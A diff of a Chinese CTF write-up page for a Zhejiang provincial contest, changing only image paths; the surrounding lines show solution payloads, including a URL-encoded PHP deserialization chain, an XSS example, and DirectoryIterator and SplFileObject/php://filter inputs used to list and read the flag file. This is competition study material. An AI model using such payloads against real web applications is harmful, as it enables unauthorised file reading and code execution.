@@ -785,19 +785,19 @@ class A1
 <pre class="line-numbers language-none"><code class="language-none">?DASCTF&#x3D;O%3A2%3A%22A1%22%3A2%3A%7Bs%3A4%3A%22tmp1%22%3BO%3A2%3A%22A3%22%3A2%3A%7Bs%3A4%3A%22tmp1%22%3BN%3Bs%3A4%3A%22tmp2%22%3BO%3A2%3A%22A4%22%3A2%3A%7Bs%3A4%3A%22tmp1%22%3BO%3A2%3A%22A6%22%3A2%3A%7Bs%3A4%3A%22tmp1%22%3BO%3A2%3A%22A8%22%3A2%3A%7Bs%3A4%3A%22tmp1%22%3BN%3Bs%3A4%3A%22tmp2%22%3BN%3B%7Ds%3A4%3A%22tmp2%22%3BN%3B%7Ds%3A4%3A%22tmp2%22%3BN%3B%7D%7Ds%3A4%3A%22tmp2%22%3BN%3B%7D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>问题就在于这里怎么利用</p>
-<p><img src="/../.images/%E8%B5%9B%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%B5%99%E6%B1%9F%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%9C%81%E8%B5%9B/image-20211023194212594.png"></p>
+<p><img src="/../images/%E8%B5%9B%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%B5%99%E6%B1%9F%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%9C%81%E8%B5%9B/image-20211023194212594.png"></p>
 <p>比赛的时候没想出来，事后问了问师傅，拿到篇文章</p>
 <p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/PrIwbUtc8KoqWcVsWte_Rg">连异常报错也能拿到flag？</a></p>
 <p>要点在于</p>
 <blockquote>
 <p>有括号的要先算括号内的</p>
 </blockquote>
-<p><img src="/../.images/%E8%B5%9B%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%B5%99%E6%B1%9F%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%9C%81%E8%B5%9B/image-20211023195520335.png"></p>
+<p><img src="/../images/%E8%B5%9B%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%B5%99%E6%B1%9F%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%9C%81%E8%B5%9B/image-20211023195520335.png"></p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"mysql"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="/../.images/%E8%B5%9B%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%B5%99%E6%B1%9F%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%9C%81%E8%B5%9B/image-20211023200144392.png"></p>
-<p><img src="/../.images/%E8%B5%9B%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%B5%99%E6%B1%9F%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%9C%81%E8%B5%9B/image-20211023200302121.png"></p>
+<p><img src="/../images/%E8%B5%9B%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%B5%99%E6%B1%9F%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%9C%81%E8%B5%9B/image-20211023200144392.png"></p>
+<p><img src="/../images/%E8%B5%9B%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%B5%99%E6%B1%9F%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%9C%81%E8%B5%9B/image-20211023200302121.png"></p>
 <p>还可以xss</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -809,7 +809,7 @@ class A1
 <p><code>*</code>是通配符</p>
 <pre class="line-numbers language-none"><code class="language-none">&amp;DAS&#x3D;DirectoryIterator&amp;CTF&#x3D;glob:&#x2F;&#x2F;*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/../.images/%E8%B5%9B%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%B5%99%E6%B1%9F%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%9C%81%E8%B5%9B/image-20211023203512726.png"></p>
+<p><img src="/../images/%E8%B5%9B%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%B5%99%E6%B1%9F%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%9C%81%E8%B5%9B/image-20211023203512726.png"></p>
 <p>文件名：<code>flaggggggggggg.php</code></p>
 <p>读内容</p>
 <pre class="line-numbers language-none"><code class="language-none">&amp;DAS&#x3D;SplFileObject&amp;CTF&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flaggggggggggg.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
@@ -909,11 +909,11 @@ a <span class="token operator">=</span> <span class="token punctuation">[</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>小改了一下，很接近了。</p>
-<p><img src="/../.images/%E8%B5%9B%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%B5%99%E6%B1%9F%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%9C%81%E8%B5%9B/image-20211024001414688.png"></p>
+<p><img src="/../images/%E8%B5%9B%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%B5%99%E6%B1%9F%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%9C%81%E8%B5%9B/image-20211024001414688.png"></p>
 <p>在这加个</p>
-<p><img src="/../.images/%E8%B5%9B%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%B5%99%E6%B1%9F%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%9C%81%E8%B5%9B/image-20211024001459116.png"></p>
+<p><img src="/../images/%E8%B5%9B%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%B5%99%E6%B1%9F%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%9C%81%E8%B5%9B/image-20211024001459116.png"></p>
 <p>倒是很接近，但还不够完善。这条路本来就是崎岖了，没必要走下去了。</p>
-<p><img src="/../.images/%E8%B5%9B%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%B5%99%E6%B1%9F%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%9C%81%E8%B5%9B/image-20211024001513778.png"></p>
+<p><img src="/../images/%E8%B5%9B%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%B5%99%E6%B1%9F%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%9C%81%E8%B5%9B/image-20211024001513778.png"></p>
 <p>队友写的：</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">compare</span><span class="token punctuation">(</span>str1<span class="token punctuation">,</span> str2<span class="token punctuation">)</span><span class="token punctuation">:</span>
     ans <span class="token operator">=</span> <span class="token number">0</span>
@@ -937,7 +937,7 @@ target <span class="token operator">=</span> <span class="token string">'reetdrv
 
 
 <p>也可以用工具一把梭。</p>
-<p><img src="/../.images/%E8%B5%9B%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%B5%99%E6%B1%9F%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%9C%81%E8%B5%9B/image-20211023202256229.png"></p>
+<p><img src="/../images/%E8%B5%9B%E9%A2%98%E7%AC%94%E8%AE%B0-%E6%B5%99%E6%B1%9F%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%9C%81%E8%B5%9B/image-20211023202256229.png"></p>
 <h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="qrimg"><a href="#qrimg" class="headerlink" title="qrimg"></a>qrimg</h3><p>可用Steganography导出二维码，用脚本批量跑一下</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
 
